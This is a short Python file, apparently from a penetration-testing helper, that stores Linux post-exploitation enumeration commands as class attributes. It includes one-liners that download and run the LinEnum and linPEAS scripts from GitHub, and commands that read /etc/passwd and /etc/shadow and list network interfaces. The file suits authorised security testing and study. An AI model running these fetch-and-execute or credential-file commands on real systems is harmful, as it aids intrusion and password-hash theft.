class LinuxEnumertion:




    class Scripts:
        # Not TOO intensive enumeration script
        class Linenum:


            data = {

                'name' : 'Linenum',

            }

            command = 'wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O linenum.sh && chmod +x ./linenum.sh && ./linenum.sh && rm ./linenum.sh'


        
        # Intensive enumeration script

        class Linpeas:

            data = {

                'name' : 'Linpeas',

            }


            command = 'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh && chmod +x ./linpeas.sh && ./linpeas.sh && rm ./linpeas.sh'




        class BSES:

            # Burmese Simple Enumeration Script (Soon)

            pass

    

    class Simple:


        class CatPassword:

            command = 'cat /etc/passwd 2>/dev/null'


        class VersionInfo:

            
            command = 'cat /etc/*-release 2>/dev/null'

        

        class ShadowFileRead:

            command = 'cat /etc/shadow 2>/dev/null'

        

        class EnvironmentPath:
            

            command = 'echo $PATH 2>/dev/null'

        class NetworkInterfaces:


            command = '/sbin/ifconfig -a 2>/dev/null'

        
        class IPInfo:

            command = '/sbin/ip a 2>/dev/null'

        





